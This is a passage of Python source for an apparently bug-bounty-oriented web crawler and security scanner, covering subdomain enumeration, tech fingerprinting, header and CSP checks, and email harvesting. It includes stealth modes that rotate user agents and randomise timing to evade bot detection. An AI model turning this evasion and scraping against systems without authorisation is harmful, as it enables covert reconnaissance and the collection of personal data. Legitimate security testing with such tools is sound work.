#!/usr/bin/env python3
import argparse
import sqlite3, re, random, sys, socket, ssl, time, json, os, heapq, itertools, signal, base64, secrets
from collections import defaultdict
import asyncio
import aiohttp
from datetime import datetime
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import urllib3
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import dns.resolver
import whois
import threading
import statistics
import difflib
import hashlib
from dataclasses import dataclass, field
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor as _BLThreadPoolExecutor

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Playwright is optional — gracefully disabled if not installed
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# playwright-stealth is optional — suppresses bot-detection fingerprints
try:
    from playwright_stealth import Stealth
    PLAYWRIGHT_STEALTH_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_STEALTH_AVAILABLE = False

# pymysql is optional — enables MySQL auth probing
try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

# websockets is optional — enables WebSocket security probing
try:
    import websockets
    import websockets.exceptions
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

# colorama is optional — provides cross-platform ANSI color support.
# Colors are disabled automatically when stdout is not a TTY (piped output).
# Fore/Style stubs ensure all references are safe even when colorama is absent.
try:
    from colorama import Fore, Style, init as _colorama_init
    _colorama_init(autoreset=True)
    _COLORAMA_AVAILABLE = True
except ImportError:
    _COLORAMA_AVAILABLE = False
    class _Stub:                    # noqa: E302
        def __getattr__(self, _):
            return ""
    Fore  = _Stub()  # type: ignore[assignment]
    Style = _Stub()  # type: ignore[assignment]

# Disable colors when not writing to a real terminal (e.g. piped to a file)
USE_COLORS: bool = _COLORAMA_AVAILABLE and sys.stdout.isatty()


def _c(text: str, fore: str, style: str = "") -> str:
    """Wrap `text` with ANSI color codes if USE_COLORS is enabled."""
    if not USE_COLORS:
        return text
    reset = Style.RESET_ALL  # type: ignore[attr-defined]
    return f"{style}{fore}{text}{reset}"


def _sev_color(severity: str) -> str:
    """Return the ANSI-colored severity label, or the plain string if colors off."""
    if not USE_COLORS:
        return severity
    mapping = {
        "CRITICAL": Fore.RED   + Style.BRIGHT,  # type: ignore[operator]
        "HIGH":     Fore.RED,
        "MEDIUM":   Fore.YELLOW,
        "LOW":      Fore.CYAN,
        "INFO":     Fore.WHITE,
    }
    code = mapping.get(severity.upper(), "")
    reset = Style.RESET_ALL  # type: ignore[attr-defined]
    return f"{code}{severity}{reset}" if code else severity

# ─────────────────────────────────────────────
# DNS cache (TTL-based, shared across threads)
# ─────────────────────────────────────────────

_DNS_CACHE: dict      = {}          # (host, family, type, proto) -> (addrs, expire_monotonic)
_DNS_CACHE_TTL: float = 300.0       # seconds
_DNS_CACHE_LOCK       = threading.Lock()
_DNS_ORIG_GETADDRINFO = socket.getaddrinfo


def _is_ip_literal(host: str) -> bool:
    """Return True if *host* is already a resolved IPv4/IPv6 address."""
    for family in (socket.AF_INET, socket.AF_INET6):
        try:
            socket.inet_pton(family, host)
            return True
        except OSError:
            pass
    return False


def _cached_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):  # noqa: A002
    """Drop-in replacement for socket.getaddrinfo that caches results for _DNS_CACHE_TTL seconds."""
    if host is None or _is_ip_literal(host):
        return _DNS_ORIG_GETADDRINFO(host, port, family, type, proto, flags)

    cache_key = (host, family, type, proto)
    now = time.monotonic()

    with _DNS_CACHE_LOCK:
        entry = _DNS_CACHE.get(cache_key)
        if entry is not None:
            addrs, expire = entry
            if now < expire:
                # Cache hit — no network round-trip needed
                return addrs

    result = _DNS_ORIG_GETADDRINFO(host, port, family, type, proto, flags)

    with _DNS_CACHE_LOCK:
        _DNS_CACHE[cache_key] = (result, now + _DNS_CACHE_TTL)

    return result


# Install the caching resolver globally — all socket-based I/O benefits automatically.
socket.getaddrinfo = _cached_getaddrinfo  # type: ignore[assignment]

# ─────────────────────────────────────────────
# Thread-local connection pool (requests.Session per thread)
# ─────────────────────────────────────────────

_thread_local = threading.local()


def _get_session() -> requests.Session:
    """Return the requests.Session for the calling thread, creating it on first use.

    Each session mounts an HTTPAdapter with connection pooling so TCP connections
    to the same host are reused across calls within the same thread.
    """
    sess = getattr(_thread_local, "session", None)
    if sess is None:
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10,
            pool_maxsize=20,
        )
        sess = requests.Session()
        sess.mount("http://", adapter)
        sess.mount("https://", adapter)
        _thread_local.session = sess
    return sess

# ─────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────

COMMON_PORTS    = [21, 22, 23, 25, 53, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]

# ─────────────────────────────────────────────
# Stealth profile system
# ─────────────────────────────────────────────

STEALTH_PROFILE  = "LOUD"  # overridden by --stealth CLI arg
BUG_BOUNTY_HEADER = None   # Set via --bug-bounty-header CLI arg. None = disabled.
SAME_DOMAIN_ONLY = False   # overridden by --same-domain-only CLI arg
START_URL        = ""      # set at crawler startup; used by is_in_scope()
ACTIVE_PROBES    = False   # overridden by --active-probes CLI arg; gates payload-injecting checks
BASELINE_ENABLED = True    # overridden by --no-baseline CLI arg; disables per-endpoint baseline profiling
TUTORIAL_MODE    = False   # overridden by --tutorial CLI arg; appends HOW TO VERIFY guidance to findings

# HackerOne scope patterns — populated by load_hackerone_scope() when --scope is used.
# HO_INCLUDE_PATTERNS: compiled regexes for in-scope assets (instruction != 'exclude')
# HO_EXCLUDE_PATTERNS: compiled regexes for out-of-scope assets (instruction == 'exclude')
HO_INCLUDE_PATTERNS: list = []
HO_EXCLUDE_PATTERNS: list = []

# ─────────────────────────────────────────────
# Third-party CDN / external service exclusion
# ─────────────────────────────────────────────
# Active probes must never fire against these domains — they are not part of
# the target scope and probing them would constitute unauthorised testing.
# is_third_party_cdn() matches exact domains and any subdomain thereof.

_THIRD_PARTY_CDN_DOMAINS = frozenset({
    # Google
    "fonts.googleapis.com",
    "ajax.googleapis.com",
    "google-analytics.com",
    "googletagmanager.com",
    "doubleclick.net",
    "googleadservices.com",
    # Cloudflare / CDN hosts
    "cdnjs.cloudflare.com",
    "cloudflare.com",
    # jsDelivr / unpkg
    "cdn.jsdelivr.net",
    "jsdelivr.net",
    "unpkg.com",
    # Font Awesome
    "fontawesome.com",
    "use.fontawesome.com",
    # jQuery
    "jquery.com",
    "code.jquery.com",
    # Bootstrap CDN
    "bootstrapcdn.com",
    "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com",
    # Social / tracking
    "facebook.net",
    "connect.facebook.net",
    "twitter.com",
    "platform.twitter.com",
    "linkedin.com",
    "snap.licdn.com",
    # Analytics / session recording
    "hotjar.com",
    "static.hotjar.com",
    # Support widgets
    "intercom.io",
    "widget.intercom.io",
    # Payment / CAPTCHA
    "stripe.com",
    "js.stripe.com",
    "recaptcha.net",
    "www.recaptcha.net",
})


def is_third_party_cdn(netloc: str) -> bool:
    """
    Return True if `netloc` is, or is a subdomain of, a known third-party
    CDN or external service that must not be actively probed.

    Strips port suffix and leading 'www.' before comparing.
    """
    host = netloc.split(":")[0].lower().lstrip("www.")
    if not host:
        return False
    for cdn in _THIRD_PARTY_CDN_DOMAINS:
        if host == cdn or host.endswith("." + cdn):
            return True
    return False


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

# GHOST: per-domain request counters and pause thresholds
_domain_request_counts = defaultdict(int)
_ghost_thresholds      = {}   # domain -> current pause threshold (15–25)

def _ghost_pause_threshold(domain):
    if domain not in _ghost_thresholds:
        _ghost_thresholds[domain] = random.randint(15, 25)
    return _ghost_thresholds[domain]

def _reset_ghost_threshold(domain):
    _ghost_thresholds[domain] = random.randint(15, 25)

def stealth_delay(domain=None):
    """Sleep before every outbound HTTP request according to STEALTH_PROFILE."""
    if STEALTH_PROFILE == "LOUD":
        return
    if STEALTH_PROFILE == "NORMAL":
        time.sleep(random.uniform(0.5, 1.5))
    elif STEALTH_PROFILE == "GHOST":
        time.sleep(random.uniform(2.0, 6.0))
        if domain:
            _domain_request_counts[domain] += 1
            if _domain_request_counts[domain] >= _ghost_pause_threshold(domain):
                time.sleep(random.uniform(8.0, 15.0))
                _domain_request_counts[domain] = 0
                _reset_ghost_threshold(domain)

def stealth_headers(existing=None):
    """Return a headers dict with stealth values merged over existing."""
    if STEALTH_PROFILE == "LOUD":
        headers = dict(existing or {})
        if BUG_BOUNTY_HEADER:
            headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
        return headers
    headers = dict(existing or {})
    headers["User-Agent"] = random.choice(UA_POOL)
    headers["Accept-Language"] = random.choice([
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "en-US,en;q=0.8,es;q=0.6",
    ])
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate"])
    if STEALTH_PROFILE == "GHOST":
        if random.random() > 0.5:
            headers["DNT"] = "1"
        else:
            headers.pop("DNT", None)
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        if random.random() > 0.5:
            headers["Upgrade-Insecure-Requests"] = "1"
        else:
            headers.pop("Upgrade-Insecure-Requests", None)
    if BUG_BOUNTY_HEADER:
        headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
    return headers
RATE_LIMIT_MIN  = 1.0
RATE_LIMIT_MAX  = 3.0
MAX_CONCURRENT  = 5
SITEMAP_CAP     = 500
REQUEST_TIMEOUT = 8
ASYNC_TIMEOUT   = 10
QUEUE_SAVE_FILE     = "crawl_state.json"
PLAYWRIGHT_FLAGS    = {"enabled": False}  # mutable — no global needed
PLAYWRIGHT_TIMEOUT  = 15000   # ms — page load timeout for Playwright
PLAYWRIGHT_MAX_CONC = 2       # max concurrent browser pages (Pi-friendly)
JS_CONTENT_MIN      = 500     # bytes — if aiohttp gets less, try Playwright
QUEUE_SAVE_INTERVAL = 25

# ─────────────────────────────────────────────
# Adaptive concurrency
# ─────────────────────────────────────────────

class AdaptiveConcurrency:
    """Dynamically adjusts worker count based on rolling response-time and error windows."""

    _WINDOW = 20

    def __init__(self, start: int = 3, min_workers: int = 1, max_workers: int = 10):
        self._lock       = threading.Lock()
        self.workers     = start
        self.min_workers = min_workers
        self.max_workers = max_workers
        self._times: list  = []   # rolling elapsed seconds
        self._errors: list = []   # rolling bool flags

    def record(self, elapsed: float, is_error: bool) -> None:
        with self._lock:
            self._times.append(elapsed)
            self._errors.append(is_error)
            if len(self._times) > self._WINDOW:
                self._times.pop(0)
                self._errors.pop(0)
            if len(self._times) >= self._WINDOW:
                self._adjust()

    def record_429(self) -> None:
        with self._lock:
            old = self.workers
            self.workers = self.min_workers
            if self.workers != old:
                print(timestamp() + " [AdaptiveConcurrency] 429 received — throttling to "
                      + str(self.workers) + " worker(s), pausing 10 s")
            time.sleep(10)

    def _adjust(self) -> None:
        avg      = sum(self._times) / len(self._times)
        err_rate = sum(self._errors) / len(self._errors)
        old = self.workers
        if err_rate > 0.20:
            self.workers = max(self.min_workers, self.workers - 2)
        elif avg > 2.0:
            self.workers = max(self.min_workers, self.workers - 1)
        elif avg < 0.5:
            self.workers = min(self.max_workers, self.workers + 1)
        if self.workers != old:
            print(timestamp() + " [AdaptiveConcurrency] " + str(old) + "→" + str(self.workers)
                  + " workers (avg=" + f"{avg:.2f}" + "s err=" + f"{err_rate:.0%}" + ")")


# Singleton — initialised in main_crawler with CLI-supplied min/max
_ac: AdaptiveConcurrency = AdaptiveConcurrency()

# ─────────────────────────────────────────────
# Priority queue helpers
# ─────────────────────────────────────────────

_pq_seq = itertools.count()   # monotonically increasing; breaks priority ties with FIFO order

_P1_RE = re.compile(
    r"/api[/\b]|/graphql|/login|/signin|/auth[/\b]|/oauth|/token[/\b]"
    r"|/admin[/\b]|/dashboard|/wp-admin|/wp-json",
    re.IGNORECASE,
)
_P2_RE = re.compile(
    r"/upload|/download|/export|/import|/backup|/config[/\b]|/setting"
    r"|/user[/\b]|/account|/profile|/reset|/password|/register"
    r"|/payment|/checkout|/invoice|/order",
    re.IGNORECASE,
)
_P4_RE = re.compile(
    r"\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|mp3|zip|gz|tar)(\?|$)",
    re.IGNORECASE,
)


def _url_priority(url: str) -> int:
    """Return crawl priority tier for *url* (1=highest … 4=lowest)."""
    path = urlparse(url).path
    if _P1_RE.search(path):
        return 1
    if _P2_RE.search(path):
        return 2
    if _P4_RE.search(path):
        return 4
    return 3


def _pq_push(queue: list, url: str) -> None:
    """Push *url* onto the heapq priority queue."""
    heapq.heappush(queue, (_url_priority(url), next(_pq_seq), url))


def _pq_pop(queue: list) -> str:
    """Pop the highest-priority URL from the heapq priority queue."""
    _, _, url = heapq.heappop(queue)
    return url


# Subdomains to probe for each discovered root domain
SUBDOMAIN_WORDLIST = [
    "www", "mail", "smtp", "pop", "imap", "ftp", "sftp",
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "api", "api2", "v1", "v2", "rest", "graphql",
    "dev", "development", "staging", "stage", "uat", "test", "qa", "sandbox",
    "beta", "alpha", "preview", "demo",
    "shop", "store", "checkout", "payments", "billing",
    "vpn", "remote", "citrix", "rdp", "ssh",
    "git", "gitlab", "github", "bitbucket", "svn",
    "jenkins", "ci", "cd", "build", "deploy",
    "jira", "confluence", "wiki", "docs", "helpdesk", "support", "status",
    "cdn", "static", "assets", "media", "img", "images", "upload",
    "blog", "news", "forum", "community",
    "db", "database", "mysql", "postgres", "redis", "mongo",
    "mx", "mx1", "mx2", "email", "webmail", "exchange",
    "ns", "ns1", "ns2", "dns",
    "backup", "old", "archive",
    "mobile", "m", "app",
    "cloud", "s3", "storage",
]

# Security headers that should be present — absence is a finding
SECURITY_HEADERS_REQUIRED = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
]

# Headers that reveal info and shouldn't be present
SECURITY_HEADERS_SENSITIVE = [
    "X-Powered-By",
    "Server",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
]

TECH_SIGNATURES = {
    # ── CMS ───────────────────────────────────────────────────────────────
    "WordPress":      {
        "headers": ["Link: wp-json", "X-Powered-By: WP Engine", "X-Powered-By: WordPress"],
        "html":    ["wp-content/", "wp-includes/", "wp-login.php", "xmlrpc.php", "wp-json",
                    'name="generator" content="WordPress'],
    },
    "Drupal":         {
        "headers": ["X-Generator: Drupal", "X-Drupal-Cache", "X-Drupal-Dynamic-Cache"],
        "html":    ["drupal.settings", "/sites/default/files", "/misc/drupal.js", "drupal.org"],
    },
    "Joomla":         {
        "headers": [],
        "html":    ["/components/com_", "joomla!", "/media/jui/", "joomla.org",
                    'name="generator" content="Joomla'],
    },
    "Shopify":        {
        "headers": ["X-ShopId", "X-ShopifyRequestId", "X-Sorting-Hat-ShopId"],
        "html":    ["cdn.shopify.com", "shopify.theme", "myshopify.com", "shopify_pay"],
    },
    "Wix":            {
        "headers": ["X-Wix-Request-Id"],
        "html":    ["static.wixstatic.com", "wixsite.com", "wix.com/_api/"],
    },
    "Squarespace":    {
        "headers": [],
        "html":    ["squarespace.com", "static.squarespace", "squarespace-cdn.com"],
    },
    # ── JS frameworks ─────────────────────────────────────────────────────
    "React":          {
        "headers": [],
        "html":    ["__reactfiber", "__reactprops", "data-reactroot", "data-reactid", "react-dom"],
    },
    "Next.js":        {
        "headers": ["X-Powered-By: Next.js"],
        "html":    ["/_next/static/", "__next_data__", "/_next/chunks/"],
    },
    "Vue.js":         {
        "headers": [],
        "html":    ["__vue__", "__vue_app__", "data-v-app", "vue.min.js", "vue.runtime.min.js"],
    },
    "Nuxt.js":        {
        "headers": [],
        "html":    ["__nuxt", "__nuxt_data__", "/_nuxt/"],
    },
    "Angular":        {
        "headers": [],
        "html":    ["ng-version", "_nghost-", "_ngcontent-", "ng-reflect-", "angular.min.js"],
    },
    "Gatsby":         {
        "headers": [],
        "html":    ["___gatsby", "gatsby-chunk-mapping", "gatsby-focus-wrapper"],
    },
    "jQuery":         {
        "headers": [],
        "html":    ["jquery.min.js", "jquery-", "/jquery/", "jquery.js"],
    },
    "Bootstrap":      {
        "headers": [],
        "html":    ["bootstrap.min.css", "bootstrap.css", "bootstrap.min.js", "bootstrap.bundle"],
    },
    # ── Web servers / CDN ─────────────────────────────────────────────────
    "Cloudflare":     {
        "headers": ["CF-RAY", "cf-cache-status", "Server: cloudflare"],
        "html":    [],
    },
    "Nginx":          {
        "headers": ["Server: nginx"],
        "html":    [],
    },
    "Apache":         {
        "headers": ["Server: Apache", "Server: apache"],
        "html":    [],
    },
    "Microsoft IIS":  {
        "headers": ["Server: Microsoft-IIS"],
        "html":    [],
    },
    "LiteSpeed":      {
        "headers": ["Server: LiteSpeed", "Server: OpenLiteSpeed", "X-LiteSpeed-Cache"],
        "html":    [],
    },
    "Cloudfront":     {
        "headers": ["X-Amz-Cf-Id", "Via: cloudfront"],
        "html":    [],
    },
    # ── Analytics / tag management ────────────────────────────────────────
    "Google Analytics": {
        "headers": [],
        "html":    ["google-analytics.com", "gtag(", "ga('create'", "analytics.js"],
    },
    "Google Tag Mgr": {
        "headers": [],
        "html":    ["googletagmanager.com/gtm.js", "googletagmanager.com/ns.html"],
    },
    # ── Backend languages / frameworks ────────────────────────────────────
    "PHP":            {
        "headers": ["X-Powered-By: PHP"],
        "html":    ["<?php", "php fatal error", "call to undefined function"],
    },
    "ASP.NET":        {
        "headers": ["X-Powered-By: ASP.NET", "X-AspNet-Version", "X-AspNetMvc-Version"],
        "html":    ["__viewstate", "__eventvalidation", "webresource.axd", "scriptresource.axd"],
    },
    "Laravel":        {
        "headers": ["Set-Cookie: laravel_session", "X-Powered-By: PHP"],
        "html":    ["laravel_session", 'name="csrf-token"', "laravel"],
    },
    "Spring Boot":    {
        "headers": ["X-Application-Context", "X-Powered-By: Spring"],
        "html":    ["whitelabel error page", "/actuator/", "spring boot"],
    },
    "Django":         {
        "headers": ["Set-Cookie: csrftoken", "X-Frame-Options: SAMEORIGIN"],
        "html":    ["csrfmiddlewaretoken", "__admin_media_prefix__", "django"],
    },
    "Ruby on Rails":  {
        "headers": ["X-Runtime", "Set-Cookie: _session_id", "X-Powered-By: Phusion Passenger"],
        "html":    ["rails-ujs", "data-remote=\"true\"", "action-cable-consumer", "actiondispatch"],
    },
}

# ─────────────────────────────────────────────
# Utility
# ─────────────────────────────────────────────

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def print_error(error):
    print(timestamp() + " " + _c("ERROR:", Fore.RED, Style.BRIGHT) + " " + str(error))

def sanitize_url(url):
    url = url.replace("https://", "").replace("http://", "").replace("www.", "")
    if url.endswith("/"):
        url = url[:-1]
    return url

def extract_root_domain(domain):
    """
    Strip subdomains using the Public Suffix List.
    Correctly handles multi-part TLDs like .co.uk, .com.au, .org.nz etc.
    Falls back to naive last-two-parts if publicsuffix2 is unavailable.
    """
    try:
        import publicsuffix2
        return publicsuffix2.get_sld(domain) or domain
    except ImportError:
        # Fallback — naive but better than nothing
        # Handles common two-part TLDs manually
        TWO_PART_TLDS = {
            "co.uk", "co.nz", "co.au", "co.za", "co.jp", "co.in",
            "com.au", "com.br", "com.mx", "com.ar", "com.sg", "com.hk",
            "org.uk", "net.uk", "me.uk", "org.au", "net.au",
            "gov.uk", "gov.au", "gov.nz", "edu.au",
        }
        parts = domain.split(".")
        if len(parts) >= 3:
            two_part = ".".join(parts[-2:])
            if two_part in TWO_PART_TLDS:
                return ".".join(parts[-3:])
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return domain

def rate_limit():
    time.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))

# ─────────────────────────────────────────────
# Resume state
# ─────────────────────────────────────────────

def save_state(start_url, url_queue, url_seen, visited, pages_crawled, same_domain_only):
    state = {
        "start_url":        start_url,
        "same_domain_only": same_domain_only,
        "pages_crawled":    pages_crawled,
        "saved_at":         timestamp(),
        "url_queue":        [item[2] for item in url_queue],  # extract URLs from (pri, seq, url) tuples
        "url_seen":         list(url_seen),
        "visited":          list(visited),
    }
    try:
        with open(QUEUE_SAVE_FILE, "w") as f:
            json.dump(state, f)
        print(timestamp() + " State saved — " + str(len(url_queue)) + " in queue, " + str(pages_crawled) + " crawled.")
    except Exception as e:
        print_error("Failed to save state: " + str(e))

def load_state():
    try:
        with open(QUEUE_SAVE_FILE, "r") as f:
            content = f.read().strip()
        if not content:
            return None
        state = json.loads(content)
        print(timestamp() + " Resuming — " + str(len(state["url_queue"])) + " in queue, " + str(state["pages_crawled"]) + " already crawled.")
        return state
    except (FileNotFoundError, json.JSONDecodeError):
        return None
    except Exception as e:
        print_error("Failed to load state: " + str(e))
        return None

def clear_state():
    try:
        if os.path.exists(QUEUE_SAVE_FILE):
            os.remove(QUEUE_SAVE_FILE)
    except Exception:
        pass

# ─────────────────────────────────────────────
# Request helpers
# Accept-Encoding deliberately excludes br to avoid brotli issues
# ─────────────────────────────────────────────

def create_request_header():
    """Build a base request header dict. Stealth overrides applied via stealth_headers()."""
    base = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding":           "gzip, deflate",
        "Accept-Language":           "en-US,en;q=0.9",
        "User-Agent":                random.choice(UA_POOL),
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest":            "document",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-User":            "?1",
        "DNT":                       "1",
    }
    return stealth_headers(base)

def safe_get(url, timeout=REQUEST_TIMEOUT, method="get"):
    try:
        domain = urlparse(url).netloc
        stealth_delay(domain)
        sess = _get_session()
        fn = sess.get if method == "get" else sess.head
        return fn(url, headers=create_request_header(), timeout=timeout, allow_redirects=True)
    except Exception:
        return None

def grab_title(url):
    resp = safe_get(url)
    if resp and resp.status_code == 200:
        try:
            soup = BeautifulSoup(resp.content, "lxml")
            t = soup.find('title')
            return str(t.string).strip() if t else None
        except Exception:
            pass
    return None

# Valid TLDs for email filtering - blocks obvious garbage
VALID_EMAIL_TLDS = {
    "com","net","org","edu","gov","io","co","uk","ca","au","de","fr",
    "nl","se","no","dk","fi","ie","nz","jp","cn","ru","br","mx","in",
    "info","biz","me","tv","us","email","mail","ninja","dev","app",
}

def is_valid_email(email):
    """Filter out garbage matches from the regex."""
    # Must have exactly one @
    if email.count("@") != 1:
        return False
    local, domain = email.split("@")
    # Local part: 1-64 chars, no leading/trailing dots or hyphens
    if not local or len(local) > 64:
        return False
    if local.startswith(".") or local.startswith("-"):
        return False
    if local.endswith(".") or local.endswith("-"):
        return False
    # Domain must have at least one dot
    if "." not in domain:
        return False
    # TLD must be recognisable
    tld = domain.rsplit(".", 1)[-1].lower()
    if tld not in VALID_EMAIL_TLDS:
        return False
    # No consecutive dots
    if ".." in email:
        return False
    # Local part must be at least 2 chars and mostly printable ascii
    if len(local) < 2:
        return False
    # Reject if local part is all uppercase (usually a CSS/hex fragment)
    if local.isupper() and len(local) < 6:
        return False
    # Must contain at least one letter
    if not re.search(r"[a-zA-Z]", local):
        return False
    return True

# TLDs that are actually image/media file extensions, not real email domains
_FAKE_EMAIL_TLDS = {
    'png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'ico', 'bmp',
    'mp4', 'mp3', 'mov', 'avi', 'pdf', 'zip', 'js', 'css', 'json'
}

def _is_real_email(candidate):
    """Return False for regex matches that are image filenames or paths, not real emails."""
    candidate = candidate.strip()
    if candidate.count('@') != 1:
        return False
    local, domain = candidate.split('@', 1)
    if '/' in domain or '\\' in domain:
        return False
    if '.' not in domain:
        return False
    tld = domain.rsplit('.', 1)[-1].lower()
    if tld in _FAKE_EMAIL_TLDS:
        return False
    if '/' in local or '\\' in local:
        return False
    if len(local) < 1:
        return False
    return True

def email_scraper(html_content):
    try:
        # Tighter regex - requires proper structure
        email_pattern = r"[a-zA-Z0-9][a-zA-Z0-9\.\-\_\+]{0,62}@[a-zA-Z0-9][a-zA-Z0-9\-]{0,62}(?:\.[a-zA-Z0-9\-]{1,63})+\.[a-zA-Z]{2,}"
        soup = BeautifulSoup(html_content, "lxml")
        # Get text only - skip script and style tags
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ")
        raw = [e for e in re.findall(email_pattern, text) if _is_real_email(e)]
        # Also check href="mailto:..." links which are more reliable
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("mailto:"):
                addr = href[7:].split("?")[0].strip()
                if addr:
                    raw.append(addr)
        # Deduplicate, lowercase, validate
        seen = set()
        for email in raw:
            email = email.lower().strip(".,;:()[] ")
            if email in seen:
                continue
            seen.add(email)
            if is_valid_email(email):
                write_to_email_database(email)
    except Exception as e:
        print_error("email_scraper: " + str(e))

# ─────────────────────────────────────────────
# Security header analysis
# ─────────────────────────────────────────────

def analyze_security_headers(domain, headers):
    """
    Check response headers for security posture.
    Flags missing protective headers and leaky informational headers.
    Saves findings to SecurityHeaders table.
    """
    try:
        missing  = []
        present  = []
        leaking  = []

        for h in SECURITY_HEADERS_REQUIRED:
            if h.lower() in {k.lower() for k in headers}:
                present.append(h)
            else:
                missing.append(h)

        for h in SECURITY_HEADERS_SENSITIVE:
            val = headers.get(h) or headers.get(h.lower())
            if val:
                leaking.append(h + ": " + str(val))
                # Alert on EOL PHP versions — known vulnerable
                if h == "X-Powered-By" and "php" in str(val).lower():
                    try:
                        php_ver = str(val).lower().replace("php/", "").strip()
                        major = php_ver.split(".")[0]
                        if major in EOL_PHP_VERSIONS:
                            alert(
                                f"EOL PHP VERSION EXPOSED: {val}",
                                "CRITICAL",
                                domain,
                                f"X-Powered-By: {val} — PHP {major}.x is end-of-life and unpatched"
                            )
                    except Exception:
                        pass

        if missing:
            print(timestamp() + " Missing security headers on " + domain + ": " + ", ".join(missing))
        if leaking:
            print(timestamp() + " Leaking headers on " + domain + ": " + ", ".join(leaking))
        if present and not missing:
            print(timestamp() + " Security headers OK on " + domain)

        write_to_security_headers_database(domain, present, missing, leaking)

        # Deep CSP analysis if header is present
        csp_value = headers.get("Content-Security-Policy") or \
                    headers.get("content-security-policy")
        if csp_value:
            analyse_csp(domain, csp_value)

    except Exception as e:
        print_error("analyze_security_headers: " + str(e))


def analyse_csp(domain, csp_value):
    """
    Parse a Content-Security-Policy header and flag specific weaknesses
    that make XSS exploitation trivially easy.

    Each weakness is independently reportable. A policy with multiple
    issues is a stronger finding — the detail lists all of them.
